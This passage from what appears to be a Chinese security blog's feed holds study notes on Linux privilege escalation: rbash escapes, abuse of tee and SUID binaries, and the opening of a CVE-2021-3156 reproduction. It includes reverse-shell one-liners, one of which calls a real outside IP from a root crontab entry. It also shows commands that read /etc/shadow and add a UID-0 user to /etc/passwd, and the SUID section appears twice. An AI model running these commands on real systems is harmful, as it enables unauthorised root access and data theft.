不能直接实现，所以在开始之前，我们需要通过 ln-s 来建立一个软连接&lt;/p&gt;&lt;pre&gt;&lt;code&gt;cd  /bin
ln -s bash rbash
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后创建用户的时候，在设置用户是以 /bin/rbash 来启动的 shell&lt;/p&gt;&lt;p&gt;&lt;code&gt;useradd -s /bin/rbash hack&lt;/code&gt;&lt;/p&gt;&lt;h1 id=&#34;rbash-绕过方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rbash-绕过方法&#34;&gt;#&lt;/a&gt; rbash 绕过方法&lt;/h1&gt;&lt;h2 id=&#34;bash_cmdsabinsha-把binbash给a变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bash_cmdsabinsha-把binbash给a变量&#34;&gt;#&lt;/a&gt; BASH_CMDS [a]=/bin/sh;a #把 /bin/bash 给 a 变量&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;/bin/bash                  
echo $0   #查看脚本本身的名字
echo $?    #命令执行结果反馈，0代表执行成功，其余数字表示不成功
export PATH=$PATH:/bin/    #将/bin 作为PATH环境变量导出
export PATH=$PATH:/usr/bin   #将/usr/bin作为PATH环境变量导出
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行完上面加粗的四步之后就可以执行所有命令了&lt;/p&gt;&lt;h2 id=&#34;vi-命令可以使用可以使用vi-获取到一个-bash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vi-命令可以使用可以使用vi-获取到一个-bash&#34;&gt;#&lt;/a&gt; vi 命令可以使用，可以使用 vi 获取到一个 bash&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;vim  test
Press ESC key
:set shell=/bin/sh
:shell
export PATH=/usr/sbin:/usr/bin:/sbin:/bin  添加全局环境变量
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;PATH 就是定义 /bin:/sbin:/usr/bin 等这些路径的变量，其中冒号为目录间的分割符。&lt;/p&gt;&lt;h2 id=&#34;使用python-突破shell-限制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用python-突破shell-限制&#34;&gt;#&lt;/a&gt; 使用 python 突破 shell 限制&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;python -c &amp;quot;import os;os.system(&#39;whoami&#39;)&amp;quot;
python -c &amp;quot;import os;os.system(&#39;/bin/sh&#39;)&amp;quot;
python -c &amp;quot;import pty;pty.spawn(&#39;/bin/sh&#39;)&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;ed-编辑器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ed-编辑器&#34;&gt;#&lt;/a&gt; ED - 编辑器&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;ed
! &#39;/bin/sh&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;perl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#perl&#34;&gt;#&lt;/a&gt; Perl&lt;/h2&gt;&lt;p&gt;&lt;code&gt;perl -e &#39;system(&amp;quot;/bin/sh&amp;quot;);&#39;&lt;/code&gt;&lt;/p&gt;&lt;h2 id=&#34;通过ssh绕过rbash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通过ssh绕过rbash&#34;&gt;#&lt;/a&gt; 通过 SSH 绕过 rbash&lt;/h2&gt;&lt;p&gt;如果您知道属于 rbash shell 的用户的 ssh 凭据，则可以在 ssh 上使用以下命令来破解监狱，并通过访问适当的 bash shell 绕过 rbash。&lt;br&gt;&lt;code&gt;ssh ignite@192.168.1.103 -t &amp;quot;bash --noprofile&amp;quot;&lt;/code&gt;&lt;/p&gt;&lt;h2 id=&#34;使用expect绕过rbash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用expect绕过rbash&#34;&gt;#&lt;/a&gt; 使用 Expect 绕过 rbash&lt;/h2&gt;&lt;p&gt;Expect 是一个 Unix 程序，可以根据脚本与其他交互式程序 “对话”。在脚本之后，Expect 知道程序可以期望什么，正确的响应应该是什么。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;expect
spwan sh
sh
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;man-绕过rbash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#man-绕过rbash&#34;&gt;#&lt;/a&gt; man 绕过 rbash&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;man man
!&#39;sh&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;通过反向shell绕过rbash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通过反向shell绕过rbash&#34;&gt;#&lt;/a&gt; 通过反向 Shell 绕过 rbash&lt;/h2&gt;&lt;p&gt;您也可以选择反向 shellcode 绕过 rbash，这里我们使用 python 反向 shellcode（penetestmokey），这会将 “sh：Bourne shell” 扔到正在监听的 netcat 上的监听机器（在本例中为 Kali Linux）我们的 Kali Linux。&lt;br&gt;&lt;code&gt;nc -lvp 1234&lt;/code&gt;&lt;br&gt;运行侦听器后，我们将运行以下命令。&lt;br&gt;&lt;code&gt;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;LISTENING IP&amp;quot;,LISTENING PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;&lt;/code&gt;&lt;/p&gt;&lt;pre&gt;&lt;code&gt;php -r &#39;$sock=fsockopen(&amp;quot;LISTENING IP&amp;quot;,LISTENING PORT);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="提权知识" scheme="http://avenue.cool/categories/Increase-authority/" />
        <category term="提权知识" scheme="http://avenue.cool/tags/%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86/" />
        <updated>2021-02-02T14:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Increase-authority/linux%20%20git%E6%8F%90%E6%9D%83/</id>
        <title>linux  git提权</title>
        <link rel="alternate" href="http://avenue.cool/Increase-authority/linux%20%20git%E6%8F%90%E6%9D%83/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h1 id=&#34;tee命令usrbintee&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tee命令usrbintee&#34;&gt;#&lt;/a&gt; tee 命令（usr/bin/tee）&lt;/h1&gt;&lt;p&gt;这是在 DC-4 靶机上遇到的&lt;/p&gt;&lt;pre&gt;&lt;code&gt;先看以下tee的用法
####################################################################
zaq@instance-f95a3vkt:/bin$ /usr/bin/tee --help
Usage: /usr/bin/tee [OPTION]... [FILE]...
Copy standard input to each FILE, and also to standard output.
  -a, --append              append to the given FILEs, do not overwrite
  -i, --ignore-interrupts   ignore interrupt signals
  -p                        diagnose errors writing to non pipes
      --output-error[=MODE]   set behavior on write error.  See MODE below
      --help     display this help and exit
      --version  output version information and exit
####################################################################
把输入写入文件，如果是-a的话就会在最后新起一行追加内容
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;tee的利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tee的利用&#34;&gt;#&lt;/a&gt; tee 的利用&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;当 /bin/sh指向/bin/bash的时候(ubuntu默认这样，当前的靶机也是这样)，反弹shell用bash的话得这样弹：
* * * * * root bash -c &amp;quot;bash -i  &amp;gt;&amp;amp;/dev/tcp/106.13.124.93/2333 0&amp;gt;&amp;amp;1&amp;quot;
这样弹shell的时候不知道为什么很慢，耐心等等
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或者：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;*/1 * * * * root perl -e &#39;use Socket;$i=&amp;quot;106.13.124.93&amp;quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;echo &amp;quot;定时计划任务&amp;quot;sudo tee -a /etc/crontab&lt;/code&gt;&lt;br&gt;值得注意的是：chmod 4777 /bin/bash 不会有这种效果 (曾经看到这个解答，我给忘了，你不用管为什么了，自己试试就好了)&lt;/p&gt;&lt;h2 id=&#34;passwd添加用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#passwd添加用户&#34;&gt;#&lt;/a&gt; passwd 添加用户&lt;/h2&gt;&lt;p&gt;前提是能够更改 test 用户的密码&lt;br&gt;&lt;code&gt;echo &amp;quot;test:x:0:0::/home/admin:/bin/bash&amp;quot; | sudo tee -a /etc/sudoers&lt;/code&gt;&lt;/p&gt;&lt;h2 id=&#34;sudoers文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sudoers文件&#34;&gt;#&lt;/a&gt; sudoers 文件&lt;/h2&gt;&lt;p&gt;&lt;code&gt;echo &amp;quot;charles ALL=(ALL:ALL) ALL&amp;quot; | sudo tee -a /etc/sudoers&lt;/code&gt;&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="提权知识" scheme="http://avenue.cool/categories/Increase-authority/" />
        <category term="提权知识" scheme="http://avenue.cool/tags/%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86/" />
        <updated>2021-02-02T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Increase-authority/linux%20SUID%20%E6%8F%90%E6%9D%83/</id>
        <title>linux SUID 提权</title>
        <link rel="alternate" href="http://avenue.cool/Increase-authority/linux%20SUID%20%E6%8F%90%E6%9D%83/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h1 id=&#34;简单介绍一下概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简单介绍一下概念&#34;&gt;#&lt;/a&gt; 简单介绍一下概念&lt;/h1&gt;&lt;p&gt;SUID（设置用户 ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有 SUID 权限，那么就可以利用系统中的二进制文件和工具来进行 root 提权。&lt;/p&gt;&lt;p&gt;已知的可用来提权的 linux 可行性的文件列表如下：&lt;br&gt;&lt;code&gt;Nmap、Vim、find、Bash、More、Less、Nano、cp&lt;/code&gt;&lt;/p&gt;&lt;p&gt;以下命令可以发现系统上运行的所有 SUID 可执行文件。具体来说，命令将尝试查找具有 root 权限的 SUID 的文件。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;find / -user root -perm -4000 -print 2&amp;gt;/dev/null
find / -perm -u=s -type f 2&amp;gt;/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;因为它们的权限中包含 &amp;quot;s&amp;quot;，并且对应的是 root 权限。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;ls -l /usr/bin/nmap
-rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;nmap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nmap&#34;&gt;#&lt;/a&gt; NMAP&lt;/h2&gt;&lt;p&gt;较旧版本的 Nmap（2.02 至 5.21）具有交互模式，允许用户执行 shell 命令。由于 Nmap 在使用 root 权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的 shell。&lt;/p&gt;&lt;p&gt;&lt;code&gt;nmap -V&lt;/code&gt;&lt;/p&gt;&lt;p&gt;交互模式可以通过执行 Nmap 参数 &amp;quot;interactive&amp;quot;&lt;/p&gt;&lt;p&gt;&lt;code&gt;nmap --interactive&lt;/code&gt;&lt;br&gt;Nmap - 交互模式&lt;br&gt;以下命令将提供一个提升的 shell。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;nmap&amp;gt; !sh
sh-3.2# whoami
root
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;提权至 Root 权限，也可以通过 Metasploit 模块对 Nmap 的二进制文件进行权限提升。&lt;br&gt;exploit/unix/local/setuid_nmap&lt;/p&gt;&lt;h2 id=&#34;find&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#find&#34;&gt;#&lt;/a&gt; Find&lt;/h2&gt;&lt;p&gt;如果 Find 命令也是以 Suid 权限运行的话，则将通过 find 执行的所有命令都会以 root 权限执行。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;touch pentestlab
find pentestlab -exec whoami \;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Find 命令权限提升&lt;br&gt;大部分 Linux 操作系统都安装了 netcat，因此也可以被利用来将权限提升至 root。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过 Find 运行 Netcat，连接上去就会直接获取到一个 Root 权限的 shell。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;netcat 192.168.1.189 5555
id
cat /etc/shadow
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;vim&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vim&#34;&gt;#&lt;/a&gt; VIM&lt;/h2&gt;&lt;p&gt;Vim 是 Linux 环境下的一款文件编辑器。但是，如果以 SUID 运行的话，它会继承 root 用户的权限，因此可以读取系统上的所有文件。&lt;br&gt;Vim - Root 权限的 shell&lt;/p&gt;&lt;pre&gt;&lt;code&gt;vim.tiny /etc/shadow
vim.tiny
 Press ESC key
:set shell=/bin/sh
:shell
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;bash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bash&#34;&gt;#&lt;/a&gt; Bash&lt;/h2&gt;&lt;p&gt;以下命令将以 root 权限打开一个 bash shell。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;less&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less&#34;&gt;#&lt;/a&gt; Less&lt;/h2&gt;&lt;p&gt;Less 和 More 都执行以用来提权。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;less /etc/passwd
!/bin/sh
more /home/pelle/myfile
!/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;cp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cp&#34;&gt;#&lt;/a&gt; cp&lt;/h2&gt;&lt;p&gt;使用 cp 覆盖 /etc/shadow&lt;/p&gt;&lt;h2 id=&#34;mv&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mv&#34;&gt;#&lt;/a&gt; mv&lt;/h2&gt;&lt;p&gt;使用 mv 覆盖 /etc/shadow 或者 /etc/sudoers&lt;/p&gt;&lt;h2 id=&#34;tcpdump&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tcpdump&#34;&gt;#&lt;/a&gt; tcpdump&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;echo $&#39;id\ncat /etc/shadow&#39; &amp;gt; /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;perl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#perl&#34;&gt;#&lt;/a&gt; perl&lt;/h2&gt;&lt;p&gt;我们现在要做的就是自己构造一个用户，在密码占位符处指定密码，并且 UID 设置为 0，将其添加到 /etc/passwd 文件中。&lt;br&gt;首先，使用 perl 语言生成带有盐值的密码：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;perl -le &#39;print crypt(&amp;quot;password@123&amp;quot;,&amp;quot;addedsalt&amp;quot;)&#39; 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后执行下面这条命令，成功将 test 用户的信息加入 /etc/passwd 文件&lt;/p&gt;&lt;pre&gt;&lt;code&gt;echo &amp;quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&amp;quot; &amp;gt;&amp;gt;/etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;awk&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#awk&#34;&gt;#&lt;/a&gt; awk&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;awk &#39;BEGIN{system(&amp;quot;whoami&amp;quot;)}&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="提权知识" scheme="http://avenue.cool/categories/Increase-authority/" />
        <category term="提权知识" scheme="http://avenue.cool/tags/%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86/" />
        <updated>2021-02-02T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Increase-authority/tee%20%E5%91%BD%E4%BB%A4%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83/</id>
        <title>tee 命令利用提权</title>
        <link rel="alternate" href="http://avenue.cool/Increase-authority/tee%20%E5%91%BD%E4%BB%A4%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h1 id=&#34;简单介绍一下概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简单介绍一下概念&#34;&gt;#&lt;/a&gt; 简单介绍一下概念&lt;/h1&gt;&lt;p&gt;SUID（设置用户 ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有 SUID 权限，那么就可以利用系统中的二进制文件和工具来进行 root 提权。&lt;/p&gt;&lt;p&gt;已知的可用来提权的 linux 可行性的文件列表如下：&lt;br&gt;&lt;code&gt;Nmap、Vim、find、Bash、More、Less、Nano、cp&lt;/code&gt;&lt;/p&gt;&lt;p&gt;以下命令可以发现系统上运行的所有 SUID 可执行文件。具体来说，命令将尝试查找具有 root 权限的 SUID 的文件。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;find / -user root -perm -4000 -print 2&amp;gt;/dev/null
find / -perm -u=s -type f 2&amp;gt;/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;因为它们的权限中包含 &amp;quot;s&amp;quot;，并且对应的是 root 权限。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;ls -l /usr/bin/nmap
-rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;nmap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nmap&#34;&gt;#&lt;/a&gt; NMAP&lt;/h2&gt;&lt;p&gt;较旧版本的 Nmap（2.02 至 5.21）具有交互模式，允许用户执行 shell 命令。由于 Nmap 在使用 root 权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的 shell。&lt;/p&gt;&lt;p&gt;&lt;code&gt;nmap -V&lt;/code&gt;&lt;/p&gt;&lt;p&gt;交互模式可以通过执行 Nmap 参数 &amp;quot;interactive&amp;quot;&lt;/p&gt;&lt;p&gt;&lt;code&gt;nmap --interactive&lt;/code&gt;&lt;br&gt;Nmap - 交互模式&lt;br&gt;以下命令将提供一个提升的 shell。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;nmap&amp;gt; !sh
sh-3.2# whoami
root
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;提权至 Root 权限，也可以通过 Metasploit 模块对 Nmap 的二进制文件进行权限提升。&lt;br&gt;exploit/unix/local/setuid_nmap&lt;/p&gt;&lt;h2 id=&#34;find&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#find&#34;&gt;#&lt;/a&gt; Find&lt;/h2&gt;&lt;p&gt;如果 Find 命令也是以 Suid 权限运行的话，则将通过 find 执行的所有命令都会以 root 权限执行。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;touch pentestlab
find pentestlab -exec whoami \;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Find 命令权限提升&lt;br&gt;大部分 Linux 操作系统都安装了 netcat，因此也可以被利用来将权限提升至 root。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过 Find 运行 Netcat，连接上去就会直接获取到一个 Root 权限的 shell。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;netcat 192.168.1.189 5555
id
cat /etc/shadow
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;vim&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vim&#34;&gt;#&lt;/a&gt; VIM&lt;/h2&gt;&lt;p&gt;Vim 是 Linux 环境下的一款文件编辑器。但是，如果以 SUID 运行的话，它会继承 root 用户的权限，因此可以读取系统上的所有文件。&lt;br&gt;Vim - Root 权限的 shell&lt;/p&gt;&lt;pre&gt;&lt;code&gt;vim.tiny /etc/shadow
vim.tiny
 Press ESC key
:set shell=/bin/sh
:shell
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;bash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bash&#34;&gt;#&lt;/a&gt; Bash&lt;/h2&gt;&lt;p&gt;以下命令将以 root 权限打开一个 bash shell。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;less&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less&#34;&gt;#&lt;/a&gt; Less&lt;/h2&gt;&lt;p&gt;Less 和 More 都执行以用来提权。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;less /etc/passwd
!/bin/sh
more /home/pelle/myfile
!/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;cp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cp&#34;&gt;#&lt;/a&gt; cp&lt;/h2&gt;&lt;p&gt;使用 cp 覆盖 /etc/shadow&lt;/p&gt;&lt;h2 id=&#34;mv&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mv&#34;&gt;#&lt;/a&gt; mv&lt;/h2&gt;&lt;p&gt;使用 mv 覆盖 /etc/shadow 或者 /etc/sudoers&lt;/p&gt;&lt;h2 id=&#34;tcpdump&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tcpdump&#34;&gt;#&lt;/a&gt; tcpdump&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;echo $&#39;id\ncat /etc/shadow&#39; &amp;gt; /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;perl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#perl&#34;&gt;#&lt;/a&gt; perl&lt;/h2&gt;&lt;p&gt;我们现在要做的就是自己构造一个用户，在密码占位符处指定密码，并且 UID 设置为 0，将其添加到 /etc/passwd 文件中。&lt;br&gt;首先，使用 perl 语言生成带有盐值的密码：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;perl -le &#39;print crypt(&amp;quot;password@123&amp;quot;,&amp;quot;addedsalt&amp;quot;)&#39; 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后执行下面这条命令，成功将 test 用户的信息加入 /etc/passwd 文件&lt;/p&gt;&lt;pre&gt;&lt;code&gt;echo &amp;quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&amp;quot; &amp;gt;&amp;gt;/etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;awk&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#awk&#34;&gt;#&lt;/a&gt; awk&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;awk &#39;BEGIN{system(&amp;quot;whoami&amp;quot;)}&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="提权知识" scheme="http://avenue.cool/categories/Increase-authority/" />
        <category term="提权知识" scheme="http://avenue.cool/tags/%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86/" />
        <updated>2021-02-02T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/2020-2021-CVE/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2021-3156)/</id>
        <title>Linux sudo权限提升漏洞复现（CVE-2021-3156)</title>
        <link rel="alternate" href="http://avenue.cool/2020-2021-CVE/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2021-3156)/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h1 id=&#34;linux-sudo权限提升漏洞复现cve-2021-3156&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linux-sudo权限提升漏洞复现cve-2021-3156&#34;&gt;#&lt;/a&gt; Linux sudo 权限提升漏洞复现（CVE-2021-3156）&lt;/h1&gt;&lt;h2 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 【原理】&lt;/h2&gt;&lt;p&gt;2021 年 01 月 27 日，RedHat 官方发布了 sudo 缓冲区 / 栈溢出漏洞的风险通告，普通用户可以通过利用此漏洞，而无需进行身份验证，成功获取 root 权限。&lt;br&gt;当 sudo 通过 - s 或 - i 命令行选项在 shell 模式下运行命令时。它将在命令参数中使用反斜杠转义特殊字符。但使用 - s 或 - i 标志运行 sudoedit 时。实际上并未进行转义，从而可能导致缓冲区溢出。只要存在 sudoers 文件 (通常是 /etc/sudoers。攻击者就可以使用本地普通用户利用 sudo 获得系统 root 权限。&lt;/p&gt;&lt;h2 id=&#34;工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工具&#34;&gt;#&lt;/a&gt; 【工具】&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;poc&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;环境搭建&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#环境搭建&#34;&gt;#&lt;/a&gt; 【环境搭建】&lt;/h2&gt;&lt;p&gt;docker 搜索 ubuntu 镜像： &lt;code&gt;docker search ubuntu:20.04&lt;/code&gt;&lt;br&gt;&lt;img data-src=&#34;/images/CVE-2021-3156/1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;然后拉取这个看起来很厉害的镜像 (Full Deskdop!)：&lt;br&gt;&lt;code&gt;docker pull manishfoodtechs/xfcefulldesktop_ubuntu20.4&lt;/code&gt;&lt;/p&gt;&lt;h2 id=&#34;检测方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#检测方法&#34;&gt;#&lt;/a&gt; [检测方法]：&lt;/h2&gt;&lt;p&gt;以非 root 用户登录系统，并运行如下命令：&lt;/p&gt;&lt;p&gt;sudoedit -s /&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;如果响应一个以 sudoedit: 开头的报错，那么表明存在漏洞。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;如果响应一个以 usage: 开头的报错，那么表明补丁已经生效。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;漏洞复现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞复现&#34;&gt;#&lt;/a&gt; 【漏洞复现】&lt;/h2&gt;&lt;p&gt;我们直接运行容器就行，进入容器的命令行&lt;br&gt;&lt;code&gt;docker run -it manishfoodtechs/xfcefulldesktop_ubuntu20.4 /bin/bash&lt;/code&gt;&lt;br&gt;&lt;img data-src=&#34;/images/CVE-2021-3156/2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;此时，我们创建一个普通的用户 &lt;code&gt;test&lt;/code&gt; ，切换到普通的用户&lt;/p&gt;&lt;pre&gt;&lt;code&gt;useradd test
passwd  test
